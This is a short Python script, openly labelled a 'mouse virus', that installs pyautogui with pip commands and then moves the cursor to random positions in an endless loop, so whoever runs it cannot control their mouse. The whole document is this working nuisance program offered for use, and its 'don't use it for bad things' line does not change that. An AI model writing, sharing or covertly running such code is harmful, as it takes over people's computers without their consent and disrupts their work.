'''
    This is a mouse virus which is created using Python
    The principe of this program is that the user can't control his mouse
    Enjoy and don't use it for bad things ;)
'''
import os
import sys

version = sys.version
if(version.startswith("2.")):
    os.system("pip install pyautogui")
else:
    os.system("pip3 install pyautogui")

import pyautogui as pag
import random

w, h = pag.size()
while True:
    x_mouse = random.randint(0, w)
    y_mouse = random.randint(0, h)

    pag.moveTo(x_mouse, y_mouse)
